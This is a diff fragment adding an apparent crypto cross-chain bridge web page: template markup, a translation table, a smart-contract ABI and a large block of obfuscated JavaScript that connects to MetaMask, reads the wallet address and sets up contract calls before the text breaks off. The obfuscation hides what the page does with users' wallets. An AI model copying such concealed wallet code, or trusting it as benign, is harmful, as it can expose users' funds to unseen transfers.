+        aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLabel">Ready to Leave?</h5>
+                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
+                    <a class="btn btn-primary" href="login.html">Logout</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap core JavaScript-->
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Core plugin JavaScript-->
+    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
+
+    <!-- Custom scripts for all pages-->
+    <script src="js/sb-admin-2.min.js"></script>
+
+    <!-- Page level plugins 
+    <script src="vendor/chart.js/Chart.min.js"></script>
+-->
+    <!-- Page level custom scripts
+    <script src="js/demo/chart-area-demo.js"></script>
+    <script src="js/demo/chart-pie-demo.js"></script>
+ -->
+
+
+    <script src="js/all.min.js" crossorigin="anonymous"></script>
+
+    <script src="js/token.js"></script>
+    <script src="js/config.js"></script>
+    <script src="js/global.js"></script>
+    <!--https://code.jquery.com/jquery-3.5.1.slim.min.js-->
+    <!--<script src="js/jquery-3.5.1.slim.min.js"    integrity=""></script>-->
+    <script src="js/popper.min.js" integrity=""></script>
+
+    <!--https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js-->
+    <!--<script src="js/bootstrap.min.js"       integrity=""     ></script>-->
+
+
+    <script src='js/bignumber.js'></script>
+    <script src="js/web3.min.js"></script>
+
+
+    <script>
+        // CHECK IF IMAGE EXISTS
+        async function checkIfImageExists(url, callback) {
+            const img = new Image();
+            img.src = url;
+
+            if (img.complete) {
+                callback(true);
+            } else {
+                img.onload = () => {
+                    callback(true);
+                };
+
+                img.onerror = () => {
+                    callback(false);
+                };
+            }
+        }
+
+
+        async function ImageError() {
+            console.log("image err")
+        }
+
+
+    </script>
+
+
+    <!-- <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>-->
+
+
+
+
+    <script type="text/javascript">
+        var arrLang = {
+            'en': {
+                'SiteTitle': '',
+                'Ethereum': 'Ethereum',
+                'Binance': 'Binance',
+                'Huobi': 'Huobi',
+                'Token Address': 'Token Address',
+            },
+            'zh': {
+                'SiteTitle': '',
+                'Ethereum': '以太坊链',
+                'Binance': '币安链',
+                'Huobi': '火币链',
+                'Token Address': '代币地址',
+
+
+            },
+
+            'ru': {
+                'SiteTitle': '',
+                'Ethereum': 'Ethereum',
+                'Binance': 'Binance',
+                'Huobi': 'Huobi',
+                'Token Address': 'Адрес токена',
+
+            },
+
+
+            'kr': {
+                'SiteTitle': '',
+                'Ethereum': 'Ethereum',
+                'Binance': 'Binance',
+                'Huobi': 'Huobi',
+                'Token Address': '토큰 주소',
+
+            },
+            'fa': {
+
+            },
+
+            'jp': {
+
+            },
+
+            'th': {
+
+            }
+
+        };
+
+        // Process translation
+        $(function () {
+            $('.translate').click(function () {
+                var lang = $(this).attr('id');
+                console.log("change language..");
+                $('.lang').each(function (index, item) {
+                    $(this).text(arrLang[lang][$(this).attr('key')]);
+                });
+            });
+        });
+    </script>
+
+
+
+    <script>
+
+
+
+
+        /*
+        
+        const BinanceTestURL='https://data-seed-prebsc-1-s1.binance.org:8545'
+        const BinanceURL='https://bsc-dataseed1.binance.org'
+        const PolygonURL='https://rpc-mainnet.maticvigil.com'
+        //const PolygonURL='https://rpc-mainnet.matic.network'
+        const FantomURL='https://rpcapi.fantom.network'
+        const AvalancheURL='https://api.avax.network/ext/bc/C/rpc'
+        
+        
+        var RopstenAddress="0xbC0b3c87a94ADc6a6403775DF981B1f1F3daBB01";
+        var KovanAddress="0x9548Bd113543bE16b9dcF62e5744321c036a19bb";
+        
+        var BinanceTestContractAddress =  "0xdC4D417552F5E42ac7D610B850BF1ff18fd4DbbB";
+        
+        var BinanceContractAddress = "0x1a4fe656542003E910466958e5511A39b5EBCbE8";
+        var PolygonContractAddress = "0x530f50669c3a3a83d70505b6b7f696082a13c9e2";
+        var FantomContractAddress = "0x1a4fe656542003E910466958e5511A39b5EBCbE8";
+        var AvalancheContractAddress = "0x1a4fe656542003E910466958e5511A39b5EBCbE8";
+        
+        
+        
+            "1": {
+                "Name":"Ethereum",
+                "ID": "1",
+                "Symbol":"ETH",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+        
+            },
+        
+            "128": {
+                "Name":"Huobi",
+                "ID": "128",
+                "Symbol":"HB",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+            },
+         "25": {
+                "Name":"Cronos",
+                "ID": "25",
+                "Symbol":"Cronos",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+            },
+            "13381": {
+                "Name":"Phoenix",
+                "ID": "13381",
+                "Symbol":"PHX",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+            },
+            "534": {
+                "Name":"Candle",
+                "ID": "534",
+                "Symbol":"CANL",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+            },
+            "3": {
+                "Name":"Ropsten Test Network",
+                "ID": "3",
+                "Symbol":"RopstenETH",
+                "OutEther":"0.001",
+                "USDAddress":"",
+                "RPCURL":"",
+                "ContractAddress":""
+            }
+        */
+
+        var SmartContractABI = [{ "inputs": [{ "internalType": "uint256", "name": "_ContractNetworkID", "type": "uint256" }, { "internalType": "address", "name": "_USDTAddress", "type": "address" }, { "internalType": "uint256", "name": "_tokenDecimals", "type": "uint256" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "bytes32", "name": "FillID", "type": "bytes32" }, { "indexed": false, "internalType": "uint256", "name": "Swapid", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "indexed": false, "internalType": "address", "name": "Initiator", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "ContractNetworkID", "type": "uint256" }], "name": "Initiated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "uint256", "name": "FromNetworkID", "type": "uint256" }, { "indexed": false, "internalType": "bytes32", "name": "ClientID", "type": "bytes32" }, { "indexed": false, "internalType": "address", "name": "FillUserAddress", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "Amount", "type": "uint256" }], "name": "transferToInitUserEvent", "type": "event" }, { "inputs": [], "name": "AdminDelegateTransferFee", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "ContractNetworkID", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "ContractOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "LastExecuteTime", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "Networks", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "name": "PayRecord", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "name": "RecordPayAlready", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_id", "type": "uint256" }], "name": "RemoveNetworkID", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "SendETHAmount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "SetSendETHAmount", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }], "name": "SetToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "ShowAllOrders", "outputs": [{ "components": [{ "internalType": "uint256", "name": "orderID", "type": "uint256" }, { "internalType": "address payable", "name": "initiator", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "CanWithdrawValue", "type": "uint256" }, { "internalType": "uint256", "name": "payoff", "type": "uint256" }, { "internalType": "enum AutoBridge.State", "name": "state", "type": "uint8" }, { "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "initerNetworkID", "type": "uint256" }], "internalType": "struct AutoBridge.Swap[]", "name": "", "type": "tuple[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "LastOrders", "type": "uint256" }], "name": "ShowLastOrders", "outputs": [{ "components": [{ "internalType": "uint256", "name": "orderID", "type": "uint256" }, { "internalType": "address payable", "name": "initiator", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "CanWithdrawValue", "type": "uint256" }, { "internalType": "uint256", "name": "payoff", "type": "uint256" }, { "internalType": "enum AutoBridge.State", "name": "state", "type": "uint8" }, { "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "initerNetworkID", "type": "uint256" }], "internalType": "struct AutoBridge.Swap[]", "name": "", "type": "tuple[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_swapId", "type": "uint256" }], "name": "ShowOrder", "outputs": [{ "components": [{ "internalType": "uint256", "name": "orderID", "type": "uint256" }, { "internalType": "address payable", "name": "initiator", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "CanWithdrawValue", "type": "uint256" }, { "internalType": "uint256", "name": "payoff", "type": "uint256" }, { "internalType": "enum AutoBridge.State", "name": "state", "type": "uint8" }, { "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "initerNetworkID", "type": "uint256" }], "internalType": "struct AutoBridge.Swap", "name": "S", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "SwapsArray", "outputs": [{ "internalType": "uint256", "name": "orderID", "type": "uint256" }, { "internalType": "address payable", "name": "initiator", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "CanWithdrawValue", "type": "uint256" }, { "internalType": "uint256", "name": "payoff", "type": "uint256" }, { "internalType": "enum AutoBridge.State", "name": "state", "type": "uint8" }, { "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "initerNetworkID", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address payable", "name": "_receiver", "type": "address" }, { "internalType": "uint256", "name": "_Amount", "type": "uint256" }], "name": "T", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address payable", "name": "_receiver", "type": "address" }, { "internalType": "uint256", "name": "_Amount", "type": "uint256" }], "name": "TT", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "TokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "TokenDecimals", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "TotalOrders", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "FromNetworkID", "type": "uint256" }, { "internalType": "bytes32", "name": "ClientID", "type": "bytes32" }, { "internalType": "address", "name": "FillUserAddress", "type": "address" }, { "internalType": "uint256", "name": "Amount", "type": "uint256" }], "name": "TransferToFillUserAtLast", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "UpdateTokenBalance", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_id", "type": "uint256" }], "name": "addNetworkID", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "_key", "type": "string" }], "name": "caculateHash", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "erc20Contract", "outputs": [{ "internalType": "contract IERC20", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "_AmountIniterWant", "type": "uint256" }], "name": "initiate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "miniumPay", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_fee", "type": "uint256" }], "name": "setFee", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "_TokenDecimals", "type": "uint256" }, { "internalType": "uint256", "name": "_min", "type": "uint256" }], "name": "setMiniumPayAndTokenDecimals", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_address", "type": "address" }], "name": "setOwner", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_address", "type": "address" }], "name": "showTokenBalance", "outputs": [{ "internalType": "uint256", "name": "bala", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "swaps", "outputs": [{ "internalType": "uint256", "name": "orderID", "type": "uint256" }, { "internalType": "address payable", "name": "initiator", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "CanWithdrawValue", "type": "uint256" }, { "internalType": "uint256", "name": "payoff", "type": "uint256" }, { "internalType": "enum AutoBridge.State", "name": "state", "type": "uint8" }, { "internalType": "uint256", "name": "NetworkIDIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "AmountIniterWant", "type": "uint256" }, { "internalType": "uint256", "name": "initerNetworkID", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "ss", "type": "uint256" }], "name": "test", "outputs": [{ "internalType": "uint256", "name": "xxx", "type": "uint256" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "withdrawWaitTime", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];
+
+        var _0x47d6b7 = _0x2aa2; (function (_0x5cabb3, _0x32e30d) { var _0x3bb483 = _0x2aa2, _0x4b6b57 = _0x5cabb3(); while (!![]) { try { var _0x2b8035 = parseInt(_0x3bb483(0x1df)) / 0x1 * (-parseInt(_0x3bb483(0x22b)) / 0x2) + -parseInt(_0x3bb483(0x307)) / 0x3 * (parseInt(_0x3bb483(0x300)) / 0x4) + -parseInt(_0x3bb483(0x39f)) / 0x5 * (parseInt(_0x3bb483(0x38b)) / 0x6) + parseInt(_0x3bb483(0x2ec)) / 0x7 * (parseInt(_0x3bb483(0x391)) / 0x8) + parseInt(_0x3bb483(0x377)) / 0x9 + parseInt(_0x3bb483(0x3c7)) / 0xa * (-parseInt(_0x3bb483(0x219)) / 0xb) + parseInt(_0x3bb483(0x1e1)) / 0xc * (parseInt(_0x3bb483(0x218)) / 0xd); if (_0x2b8035 === _0x32e30d) break; else _0x4b6b57['push'](_0x4b6b57['shift']()); } catch (_0xbf7ab5) { _0x4b6b57['push'](_0x4b6b57['shift']()); } } }(_0x2034, 0xb854d)); var Coins = { '1': { 'Name': 'Ethereum', 'ID': '1', 'Symbol': 'ETH', 'OutEther': _0x47d6b7(0x3b8), 'USDSymbol': _0x47d6b7(0x2e4), 'USDAddress': '0x6B175474E89094C44Da98b954EedeAC495271d0F', 'USDdecimals': 0x12, 'USDFee': 0x2, 'RPCURL': '\x20\x20https://rpc.ankr.com/eth', 'Scan': _0x47d6b7(0x363), 'ContractAddress': _0x47d6b7(0x2d4) }, '56': { 'Name': _0x47d6b7(0x345), 'ID': '56', 'Symbol': _0x47d6b7(0x3c8), 'OutEther': _0x47d6b7(0x257), 'USDSymbol': _0x47d6b7(0x32c), 'USDAddress': _0x47d6b7(0x392), 'USDdecimals': 0x12, 'USDFee': 0x1, 'RPCURL': _0x47d6b7(0x39d), 'Scan': _0x47d6b7(0x2ad), 'ContractAddress': _0x47d6b7(0x2d4) }, '137': { 'Name': 'Polygon', 'ID': _0x47d6b7(0x256), 'Symbol': 'Matic', 'OutEther': _0x47d6b7(0x257), 'USDSymbol': _0x47d6b7(0x32c), 'USDAddress': '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', 'USDdecimals': 0x6, 'USDFee': 0x1, 'RPCURL': _0x47d6b7(0x2e0), 'Scan': _0x47d6b7(0x282), 'ContractAddress': _0x47d6b7(0x214) }, '250': { 'Name': 'Fantom', 'ID': '250', 'Symbol': 'FTM', 'OutEther': _0x47d6b7(0x257), 'USDSymbol': _0x47d6b7(0x38a), 'USDAddress': _0x47d6b7(0x38c), 'USDdecimals': 0x6, 'USDFee': 0x1, 'RPCURL': _0x47d6b7(0x21f), 'Scan': _0x47d6b7(0x362), 'ContractAddress': '0x1a4fe656542003E910466958e5511A39b5EBCbE8' }, '43114': { 'Name': _0x47d6b7(0x36c), 'ID': _0x47d6b7(0x251), 'Symbol': _0x47d6b7(0x399), 'OutEther': _0x47d6b7(0x257), 'USDSymbol': _0x47d6b7(0x280), 'USDAddress': '0xc7198437980c041c805a1edcba50c1ce5db95118', 'USDdecimals': 0x6, 'USDFee': 0x1, 'RPCURL': _0x47d6b7(0x260), 'Scan': _0x47d6b7(0x2c6), 'ContractAddress': _0x47d6b7(0x2d4) } }; console['log'](_0x47d6b7(0x25f), FeeReciever), console[_0x47d6b7(0x3bb)](_0x47d6b7(0x275)); var UseAdapters, UseScan, PolygonScanURL = _0x47d6b7(0x282), AvalancheScanURL = _0x47d6b7(0x2c6), BinanceScanURL = 'https://bscscan.com/', FantomScanURL = _0x47d6b7(0x362), HecoScanURL = 'https://hecoinfo.com/', CronosScanURL = _0x47d6b7(0x217); let USDIn, USDOut, MaxTradeUSD = 0x1; var NeedApproveToken = ![], BeeFee = 0.0123456, SenderNetworkID = 0x38, RecieverNetworkID = 0x89, CSVEtherTotal = 0x0, ContractFee, SendTokenBool = ![], binanceLimit, polygonLimit, fantomLimit, SendFee, MyTokenBalance, myContract, TransferContract, TokenContract, PriceResult, CurrentTokenDecimals = 0x0, EthereumScan = _0x47d6b7(0x23e), BinanceScan = _0x47d6b7(0x2af), PolygonScan = _0x47d6b7(0x3b9), FantomScan = 'https://ftmscan.com/tx/', CronosScan = _0x47d6b7(0x1e6), AvalancheScan = _0x47d6b7(0x310), PhoenixScan = _0x47d6b7(0x287), RopstenScan = _0x47d6b7(0x34d), KovanScan = _0x47d6b7(0x34d), CandleScan = _0x47d6b7(0x205); console['log']('IsMetamask'); var TokenContractAddress, BlockchainScan, RopstenTokenAddress = _0x47d6b7(0x2cc), KovanTokenAddress = '0xBc4A22F4A76367a4F503BCDfB2c6ee6b115537a7', binanceTokenAddress = _0x47d6b7(0x392), polygonTokenAddress = _0x47d6b7(0x25e), fantomTokenAddress = '0x04068da6c83afcfa0e13ba15a6696662335d5b75', contractAdress, NetID, RopstenAddress = '', KovanAddress = '', BinanceTestContractAddress = '', EthereumContractAddress = '', HuobiContractAddress = '', BinanceContractAddress = '0x066fE67a495642f2395dba66e9F8925D448b2CD2', PolygonContractAddress = _0x47d6b7(0x2d3), FantomContractAddress = _0x47d6b7(0x28c), AvalancheContractAddress = _0x47d6b7(0x319), HecoContractAddress = '0x520827a2897587FcF6c30A9C0e549ec5216148D6', CronosContractAddress = _0x47d6b7(0x2d3), PhoenixContractAddress = '', CandleContractAddress = '', Isend, Iwant; window['onload'] = function () { var _0x1e07bf = _0x47d6b7; document[_0x1e07bf(0x390)] = function (_0x433a03) { var _0x12d79f = _0x1e07bf; _0x433a03['target']['id'] != _0x12d79f(0x2ff) && _0x433a03[_0x12d79f(0x226)]['id'] != 'FromButton' && _0x433a03['target']['id'] != 'FromInput' && $(_0x12d79f(0x35b))[_0x12d79f(0x2d7)](), _0x433a03['target']['id'] != 'SelectIWant' && _0x433a03[_0x12d79f(0x226)]['id'] != _0x12d79f(0x2a7) && _0x433a03[_0x12d79f(0x226)]['id'] != 'ToInput' && $(_0x12d79f(0x31a))[_0x12d79f(0x2d7)](); }; }; async function CheckMetamaskConnection() { var _0x3fc6a2 = _0x47d6b7; if (window[_0x3fc6a2(0x36f)]) { window[_0x3fc6a2(0x39b)] = new Web3(window['ethereum']); try { return await ethereum['enable'](), window[_0x3fc6a2(0x36f)]['on'](_0x3fc6a2(0x398), function (_0x4d75da) { var _0x30eb77 = _0x3fc6a2; console[_0x30eb77(0x3bb)](_0x30eb77(0x366), _0x4d75da), window[_0x30eb77(0x309)]['reload'](); }), window[_0x3fc6a2(0x36f)]['on']('chainChanged', function (_0x26f113) { var _0x11e24e = _0x3fc6a2; console[_0x11e24e(0x3bb)]('chainChanged', _0x26f113), window[_0x11e24e(0x309)][_0x11e24e(0x27f)](); }), !![]; } catch (_0x48ad8c) { return ![]; } } else return window[_0x3fc6a2(0x39b)] ? (window[_0x3fc6a2(0x39b)] = new Web3(web3[_0x3fc6a2(0x1e4)]), !![]) : (console[_0x3fc6a2(0x3bb)](_0x3fc6a2(0x2b2)), ![]); } $(document)[_0x47d6b7(0x27a)](async function () { var _0x151250 = _0x47d6b7; $(_0x151250(0x37c))[_0x151250(0x20d)](function () { var _0x11b4b6 = _0x151250; $('.toast')[_0x11b4b6(0x2b9)](_0x11b4b6(0x29e)); }); var _0x3ab08e = await CheckMetamaskConnection(); if (_0x3ab08e) { var _0x1783fe = !![], _0x24d41e = await web3['eth']['net'][_0x151250(0x243)](); NetID = _0x24d41e, console[_0x151250(0x3bb)](_0x24d41e); var _0x43fcb0 = ![]; switch (_0x24d41e) { case 0x1: console[_0x151250(0x3bb)](_0x151250(0x30e)), _0x43fcb0 = !![]; break; case 0x2: console[_0x151250(0x3bb)]('This\x20is\x20the\x20deprecated\x20Morden\x20test\x20network.'); break; case 0x3: console[_0x151250(0x3bb)](_0x151250(0x2e2)); break; case 0x19: console[_0x151250(0x3bb)](_0x151250(0x37f)); break; case 0x2a: console['log'](_0x151250(0x379)); break; case 0x38: console[_0x151250(0x3bb)](_0x151250(0x265)), _0x43fcb0 = !![]; break; case 0x61: console[_0x151250(0x3bb)](_0x151250(0x356)); break; case 0x6c: console[_0x151250(0x3bb)](_0x151250(0x2f4)); break; case 0x80: console[_0x151250(0x3bb)](_0x151250(0x216)); break; case 0x89: console['log'](_0x151250(0x3ac)), _0x43fcb0 = !![]; break; case 0xfa: console[_0x151250(0x3bb)](_0x151250(0x371)), _0x43fcb0 = !![]; break; case 0x216: console[_0x151250(0x3bb)](_0x151250(0x28e)); break; case 0x3445: console['log']('This\x20is\x20the\x20Phoenix\x20network.'); break; case 0xa86a: console['log']('This\x20is\x20Avalanche\x20mainnet'), _0x43fcb0 = !![]; break; default: document['getElementById']('CurrentBlockchainImageID')[_0x151250(0x2a0)] = 'img/' + _0x151250(0x24e), console[_0x151250(0x3bb)](_0x151250(0x3a9)); }if (!_0x43fcb0) { $(_0x151250(0x2de))[_0x151250(0x383)](_0x151250(0x349)), console[_0x151250(0x3bb)](_0x151250(0x2e7)), $('#InitPageLoader')[_0x151250(0x2d7)](); throw new Error(_0x151250(0x370)); } $(_0x151250(0x361))['html'](_0x151250(0x2db) + Coins[_0x24d41e][_0x151250(0x291)]), $('#BlockchainNameID')[_0x151250(0x383)](Coins[_0x24d41e][_0x151250(0x1fa)]), SenderNetworkID = _0x24d41e, await addTokenList(), MainCoin = Coins[_0x24d41e][_0x151250(0x291)], console[_0x151250(0x3bb)](_0x151250(0x37e), MainCoin), console[_0x151250(0x3bb)](_0x151250(0x3d1), Coins[_0x24d41e][_0x151250(0x1e0)]), contractAdress = Coins[_0x24d41e][_0x151250(0x2f2)], document['getElementById'](_0x151250(0x233))[_0x151250(0x3c2)] = _0x24d41e; var _0x571312 = web3['currentProvider']['selectedAddress'], _0x5dcf30 = web3[_0x151250(0x1e4)][_0x151250(0x2bc)], _0x477fdd = web3[_0x151250(0x1e4)][_0x151250(0x2bc)]['length'] - 0x4, _0x87c079 = _0x5dcf30[_0x151250(0x292)](0x0, 0x6), _0x516eb9 = _0x5dcf30['substring'](_0x477fdd, web3[_0x151250(0x1e4)][_0x151250(0x2bc)][_0x151250(0x253)]), _0x2c7eeb = _0x87c079 + '.......' + _0x516eb9; $(_0x151250(0x2cb))[_0x151250(0x383)](_0x2c7eeb), myContract = await new web3[(_0x151250(0x245))][(_0x151250(0x235))](SmartContractABI, contractAdress, { 'from': web3[_0x151250(0x1e4)][_0x151250(0x2bc)] }), $(_0x151250(0x30c))[_0x151250(0x2d7)](), console[_0x151250(0x3bb)](_0x151250(0x238), SenderNetworkID), await UpdateInfo(); if (SenderNetworkID != 0x1 || SenderNetworkID != 0xa86a) { } var _0x533ee7 = web3[_0x151250(0x1e4)][_0x151250(0x2bc)], _0x354713, _0xbd064d, _0x69d76d; async function _0x1f70ba() { var _0x39e612 = _0x151250, _0x5ccd2f = await web3['eth'][_0x39e612(0x353)][_0x39e612(0x243)](); console[_0x39e612(0x3bb)](_0x5ccd2f); switch (_0x5ccd2f) { case 0x1: console[_0x39e612(0x3bb)]('This\x20is\x20mainnet'); break; case 0x2: console[_0x39e612(0x3bb)](_0x39e612(0x230)); break; case 0x3: console['log']('This\x20is\x20the\x20ropsten\x20test\x20network.'), TokenContractAddress = RopstenTokenAddress, contractAdress = RopstenAddress, document[_0x39e612(0x333)](_0x39e612(0x2ff))['value'] = 0x3; break; case 0x2a: console[_0x39e612(0x3bb)](_0x39e612(0x396)), TokenContractAddress = KovanTokenAddress, contractAdress = KovanAddress, document[_0x39e612(0x333)]('SelectISend')[_0x39e612(0x3c2)] = 0x2a; break; case 0x38: console[_0x39e612(0x3bb)](_0x39e612(0x1ef)), TokenContractAddress = binanceTokenAddress, contractAdress = BinanceContractAddress; break; case 0x61: contractAdress = BinanceTestContractAddress, console[_0x39e612(0x3bb)](_0x39e612(0x356)); break; case 0x6c: console[_0x39e612(0x3bb)](_0x39e612(0x2f4)); break; case 0x80: console[_0x39e612(0x3bb)](_0x39e612(0x376)); break; case 0x89: TokenContractAddress = polygonTokenAddress, contractAdress = PolygonContractAddress, console[_0x39e612(0x3bb)](_0x39e612(0x25a)); break; case 0xfa: TokenContractAddress = fantomTokenAddress, contractAdress = FantomContractAddress, console['log'](_0x39e612(0x2cd)); break; default: document['getElementById']('CurrentBlockchainImageID')[_0x39e612(0x2a0)] = 'img/' + String(0x1) + '.png', console[_0x39e612(0x3bb)](_0x39e612(0x3a9)); }document[_0x39e612(0x333)](_0x39e612(0x278))[_0x39e612(0x2a0)] = 'img/' + _0x5ccd2f + _0x39e612(0x358); } function _0x38b05f() { var _0x1560fd = _0x151250; fetch('https://api.coingecko.com/api/v3/coins/bitcoin?localization=false&sparkline=false')[_0x1560fd(0x2dd)](_0x350d50 => _0x350d50[_0x1560fd(0x34c)]())[_0x1560fd(0x2dd)](_0x3dfcac => { var _0x59c013 = _0x1560fd; const _0x259fce = _0x3dfcac[_0x59c013(0x204)]; _0x10324a(_0x59c013(0x385))[_0x59c013(0x332)] = _0x59c013(0x2ce) + _0x259fce[_0x59c013(0x2c1)][_0x59c013(0x269)][_0x59c013(0x2df)](0x0), document[_0x59c013(0x333)](_0x59c013(0x2c2))[_0x59c013(0x3c2)] = _0x259fce[_0x59c013(0x2c1)][_0x59c013(0x269)][_0x59c013(0x2df)](0x0); }); } function _0x10324a(_0x577e34) { return document['getElementById'](_0x577e34); } $(_0x151250(0x1e5))[_0x151250(0x20d)](function () { var _0x4a3d44 = _0x151250; $(_0x4a3d44(0x234))[_0x4a3d44(0x383)](''), $(_0x4a3d44(0x2a5))[_0x4a3d44(0x383)](''), $(_0x4a3d44(0x22d))[_0x4a3d44(0x29e)](), SendMultiToken(); }), console[_0x151250(0x3bb)]('Metamask\x20detected!'), $(_0x151250(0x2b4))[_0x151250(0x29e)](), $('#InitPageLoader')[_0x151250(0x2d7)](); } else 